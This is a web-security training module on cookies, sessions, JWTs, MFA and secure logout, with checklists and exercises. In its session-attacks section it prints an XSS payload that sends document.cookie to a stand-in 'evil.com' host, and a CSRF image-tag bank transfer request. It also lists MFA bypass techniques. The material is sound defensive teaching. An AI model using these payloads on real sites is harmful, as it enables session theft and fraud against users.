# Cookies, Sessions, and Authentication

## 1. Orientation

### What this module covers
This module explains how web applications maintain state and identity—cookies for session management, tokens for API authentication, and the security implications of each approach.

### Fit in the Learning Path
Session hijacking, token theft, and authentication bypass are among the most impactful web attacks. Understanding how authentication mechanisms work is essential for both exploitation and defense.

### Learning Objectives
By the end of this module, you will:
*   Understand HTTP statelessness and session management
*   Compare cookie-based vs token-based authentication
*   Identify session security vulnerabilities
*   Implement secure authentication practices

---

## 2. Core Content

### Mental Model: The Wristband

**How professionals think about this:**
HTTP is stateless—each request is independent. Sessions are like concert wristbands: after showing your ticket (password) once, you get a wristband (session) that proves you're allowed in. Attacks target the wristband, not the ticket.

```
SESSION CONCEPT:

AUTHENTICATION (Proving identity):
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│  1. User: "I am alice, my password is secret123"                   │
│              ↓                                                      │
│  2. Server: Verifies password against stored hash                  │
│              ↓                                                      │
│  3. Server: Creates session_id = "abc123xyz"                       │
│              ↓                                                      │
│  4. Server: Returns Set-Cookie: session_id=abc123xyz               │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘

SUBSEQUENT REQUESTS:
┌─────────────────────────────────────────────────────────────────────┐
│                                                                     │
│  Browser automatically sends:                                       │
│  Cookie: session_id=abc123xyz                                       │
│              ↓                                                      │
│  Server: Looks up abc123xyz → Finds user=alice                     │
│              ↓                                                      │
│  Server: Processes request as alice                                │
│              ↓                                                      │
│  (Password never sent again)                                       │
│                                                                     │
└─────────────────────────────────────────────────────────────────────┘
```

### Cookie-Based Sessions

**Traditional session management:**

```
COOKIE SESSION FLOW:

Server-side storage:
─────────────────────────────
Sessions stored on server (database, Redis, file)
Cookie contains only session ID
Server looks up ID to get user data

Set-Cookie: session_id=abc123xyz; 
            Path=/; 
            HttpOnly; 
            Secure; 
            SameSite=Strict

COOKIE SECURITY ATTRIBUTES:

Secure:     Only sent over HTTPS
HttpOnly:   JavaScript cannot access
SameSite:   Cross-site request policy
Domain:     Which domains receive cookie
Path:       Which paths receive cookie
Expires:    When cookie expires

SECURITY CONFIGURATION MATRIX:

Attribute        | Set        | Not Set
─────────────────┼────────────┼─────────────────
Secure           | HTTPS only | HTTP exposes cookie
HttpOnly         | XSS safe   | XSS can steal cookie
SameSite=Strict  | CSRF safe  | Cross-site sends cookie
SameSite=Lax     | Links OK   | Forms cross-site blocked
SameSite=None    | API use    | CSRF vulnerable (needs Secure)
```

### Token-Based Authentication

**Modern stateless approach:**

```
JWT (JSON Web Token):
─────────────────────────────
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.
eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE2NzA0...
SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

STRUCTURE:
[Header].[Payload].[Signature]

Header:   {"alg": "HS256", "typ": "JWT"}
Payload:  {"user": "alice", "role": "admin", "exp": 1670400000}
Signature: HMAC(header.payload, secret)

ADVANTAGES:
─────────────────────────────
- Stateless (no server-side storage)
- Self-contained (user info in token)
- Works across domains
- Scales easily (no shared session store)

DISADVANTAGES:
─────────────────────────────
- Cannot revoke individual tokens
- Larger than session ID
- Payload is readable (just Base64)
- If secret leaks, all tokens compromised
```

**Token storage comparison:**

| Storage | XSS Risk | CSRF Risk | Notes |
|---------|----------|-----------|-------|
| HTTP-only Cookie | Protected | Needs SameSite | Most secure |
| localStorage | Vulnerable | Protected | Common, risky |
| sessionStorage | Vulnerable | Protected | Cleared on tab close |
| Memory only | Protected | Protected | Lost on refresh |

### Session Security Vulnerabilities

**Common attack vectors:**

```
SESSION ATTACKS:

1. SESSION HIJACKING
   ─────────────────────────────
   Steal valid session cookie
   Become the user without password
   
   Methods:
   - XSS: <script>fetch('//evil.com?c='+document.cookie)</script>
   - Network sniffing (HTTP without TLS)
   - Malware on victim machine
   
   Defense: HttpOnly, HTTPS, short expiration

2. SESSION FIXATION
   ─────────────────────────────
   Attacker sets session ID before victim logs in
   
   Attack:
   1. Attacker gets session_id=EVIL123
   2. Attacker sends link with session_id=EVIL123
   3. Victim logs in using that session
   4. Attacker uses session_id=EVIL123 as victim
   
   Defense: Generate NEW session ID after login

3. CSRF (Cross-Site Request Forgery)
   ─────────────────────────────
   Trick authenticated user into making requests
   
   Attack:
   <img src="https://bank.com/transfer?to=attacker&amount=1000">
   
   User's browser sends their cookie automatically
   
   Defense: CSRF tokens, SameSite cookies

4. JWT VULNERABILITIES
   ─────────────────────────────
   Algorithm confusion: alg:none bypass
   Weak secret: Brute force HMAC key
   No expiration: Tokens valid forever
   Sensitive data in payload: Visible to anyone
   
   Defense: Validate algorithm, strong secrets, short expiry
```

### Logout and Session Invalidation

**Properly ending sessions:**

```
LOGOUT MECHANISMS:

CLIENT-SIDE (Incomplete):
─────────────────────────────
Delete cookie from browser
Clear localStorage

Problem: Session still valid on server
         Stolen token still works

SERVER-SIDE (Proper):
─────────────────────────────
Mark session as invalid in database
Add token to blacklist
Clear client-side storage

Implementation:
1. Client: POST /logout
2. Server: DELETE sessions WHERE id=current
3. Server: Set-Cookie: session=; Max-Age=0
4. Client: Redirect to login

JWT REVOCATION CHALLENGE:
─────────────────────────────
JWTs are stateless = no server-side record
Cannot truly "invalidate" a JWT

Solutions:
- Short expiration (15 minutes)
- Refresh token rotation
- Token blacklist (adds state back)
```

### Multi-Factor Authentication

**Strengthening authentication:**

```
MFA FACTORS:

Something you KNOW:
Password, PIN, security question

Something you HAVE:
Phone (SMS, Auth app), Hardware key (YubiKey)

Something you ARE:
Fingerprint, Face ID, retina scan

MFA IMPLEMENTATION:
─────────────────────────────
1. User enters username/password
2. Server validates credentials
3. Server sends challenge (code to phone)
4. User enters code
5. Server validates code
6. Session created

BYPASS TECHNIQUES:
─────────────────────────────
- Phishing: Real-time proxy captures both factors
- SIM swapping: Take over phone number
- Social engineering: Call support
- Session after MFA: Steal token after MFA complete
- MFA fatigue: Spam push notifications

DEFENSE:
─────────────────────────────
- Hardware keys (phishing resistant)
- Number matching (prevent fatigue)
- Risk-based step-up authentication
```

### Session Best Practices

**Secure implementation:**

```
SESSION SECURITY CHECKLIST:

GENERATION:
□ Use cryptographically secure random IDs
□ Sufficient entropy (128+ bits)
□ Regenerate ID after login
□ Regenerate ID after privilege change

TRANSMISSION:
□ HTTPS only (Secure flag)
□ HttpOnly flag
□ SameSite=Strict or Lax
□ Set Domain and Path appropriately

STORAGE:
□ Server-side session storage
□ Encrypt sensitive session data
□ Bind session to user agent/IP (optional)

EXPIRATION:
□ Absolute timeout (e.g., 8 hours)
□ Idle timeout (e.g., 30 minutes)
□ Proper logout mechanism
□ Clear expired sessions

VALIDATION:
□ Validate session on every request
□ Check session hasn't expired
□ Verify session belongs to expected user
□ Log session anomalies
```

---

## 3. Guided Practice

### Exercise 1: Session Inspection

Open DevTools → Application tab:

1. What session cookies exist? ___
2. Are they marked HttpOnly? ___
3. Are they marked Secure? ___
4. What is the SameSite value? ___

### Exercise 2: JWT Analysis

Decode this JWT at jwt.io:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4iLCJpYXQiOjE2MDAwMDAwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

1. What algorithm? ___
2. What user/role? ___
3. Is there an expiration? ___

### Exercise 3: Attack Scenario

User logs in on public WiFi:

1. Cookie has Secure flag missing. Risk? ___
2. Cookie has HttpOnly missing. Risk? ___
3. Session doesn't regenerate after login. Risk? ___

---

## 4. Reflection Check

### Session Understanding
1. User clears cookies but session still works. Where is session stored?

2. JWT expiration is 24 hours. User's account is compromised. Can you revoke their token?

3. Session ID changes after login. Why?

### Security Thinking
1. Application uses localStorage for token. Attacker finds XSS. Impact?

2. SameSite=None required for cross-origin API. How do you mitigate CSRF?

3. User reports someone accessed their account. Logs show same session from two countries. What happened?

---

## 5. Key Misconceptions

**MYTH: "HTTPS protects my session cookie"**
REALITY: HTTPS protects transmission. XSS, malware, or browser extensions can still steal cookies.

**MYTH: "JWTs are more secure than sessions"**
REALITY: Each has trade-offs. JWTs in localStorage are vulnerable to XSS. Sessions need secure server-side storage.

**MYTH: "Logout deletes the session"**
REALITY: Client-side logout just removes cookie. Server must invalidate session for true logout.

**MYTH: "Long session timeout is user-friendly"**
REALITY: Long timeouts increase window for session hijacking. Balance convenience with security.

**MYTH: "HttpOnly alone prevents session theft"**
REALITY: HttpOnly prevents JavaScript theft but not network sniffing, CSRF, or server-side vulnerabilities.

---

## 6. Completion Criteria

This module is complete when you can:

1. **Explain** cookie-based vs token-based authentication
2. **Configure** secure cookie attributes
3. **Identify** session security vulnerabilities
4. **Implement** proper logout mechanisms
5. **Analyze** session security in browser DevTools

---

## 7. Further Depth (Optional)

*   **Tool:** Use Burp Suite to manipulate sessions
*   **Practice:** OWASP WebGoat session management lessons
*   **Research:** OAuth 2.0 and OpenID Connect
*   **Lab:** Implement session fixation protection
